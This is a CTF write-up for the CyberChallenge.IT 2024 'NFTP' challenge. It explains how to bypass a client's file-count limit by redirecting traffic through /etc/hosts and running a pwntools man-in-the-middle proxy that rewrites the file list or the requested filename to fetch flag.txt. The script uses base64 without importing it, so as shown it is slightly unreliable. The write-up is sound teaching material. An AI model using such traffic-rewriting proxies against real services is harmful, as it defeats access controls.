# CyberChallenge.IT 2024 - University CTF

## [misc] NFTP (6 solves)

The other day I got the idea for this new protocol, the New File Transfer Protocol, to list and download files. I still have to think about file upload, but that's not the point. I gave you a (partial) reference code in Python and my preliminary implementation, can you audit it for me?

Author: Matteo Protopapa <@matpro>

## Overview

The challenge implements a client that can list and get the files on the server, but the `get` function is limited by

```python
if n >= self.num_files:
    if self.verbose:
        print('Too many files')
    return 1
```

which means that we can download all but the last file, which turns to be `flag.txt`.

## Solution

Given that the binary should be hard to reverse (and patch), the easiest solution is to perform a Man In The Middle attack, using a proxy that modifies the requests or the responses during the interaction with the server.

We propose two solution paths:

- changing the filename requested (on the "client side"), so that the client asks for `flag.txt`;
- changing the list of files (on the "server side"), so that the server lists `flag.txt` before the last position and thus the client allows the user to request its content.

Clearly, to perform the MITM attack, we have to change the address resolved by the binary, e.g. changing the `/etc/hosts` so that the domain points to `127.0.0.1`.

## Exploit

An example of proxy is the following, in which we can change how it works with `PROXY_TYPE`:

- `NONE`: the proxy doesn't modify the exchanged data
- `SERVER`: the proxy modifies the list of files returned by the server
- `CLIENT`: the proxy modifies the requested filename

``` python
from pwn import listen, remote
import os

NONE   = 0
SERVER = 1
CLIENT = 2
PROXY_TYPE = SERVER


HOST = os.environ.get("HOST")
PORT = int(os.environ.get("PORT"))


def auth(l, r):
    l.sendline(r.recvline(False))
    r.sendline(l.recvline(False))
    l.sendline(r.recvline(False))


def list_files0(l, r):
    r.sendline(s)
    l.sendline(r.recvline(False))
    n = r.recvline(False)
    l.sendline(n)
    for _ in range(int(n.decode())):
        l.sendline(r.recvline(False))


def get_files0(l, r):
    r.sendline(s)
    l.sendline(r.recvline(False))
    l.sendline(r.recvline(False))


def list_files1(l, r):
    r.sendline(s)
    l.sendline(r.recvline(False))
    n = r.recvline(False)
    l.sendline(n)
    old = b'flag.txt'
    for _ in range(int(n.decode())):
        l.sendline(old)
        old = r.recvline(False)


def get_files1(l, r):
    r.sendline(s)
    l.sendline(r.recvline(False))
    l.sendline(r.recvline(False))


def list_files2(l, r):
    r.sendline(s)
    l.sendline(r.recvline(False))
    n = r.recvline(False)
    l.sendline(n)
    for _ in range(int(n.decode())):
        l.sendline(r.recvline(False))


def get_files2(l, r):
    _s = base64.b64decode(s).decode()
    _s = ' '.join(_s.split(' ')[:-1] + ['flag.txt']).encode()
    r.sendline(base64.b64encode(_s))
    l.sendline(r.recvline(False))
    l.sendline(r.recvline(False))


functions = [(list_files0, get_files0), (list_files1, get_files1), (list_files2, get_files2)]
list_files, get_files = functions[PROXY_TYPE]

l = listen(PORT)
r = remote(HOST, PORT)

auth(l, r)

while True:
    s = l.recvline(False)
    
    cmd = base64.b64decode(s).decode().split(' ')[1]

    match cmd:
        case 'exit':
            quit()
        case 'list':
            list_files(l, r)
        case 'get':
            get_files(l, r)
```

At this point, the flag can be retrieved just by interacting with the client.
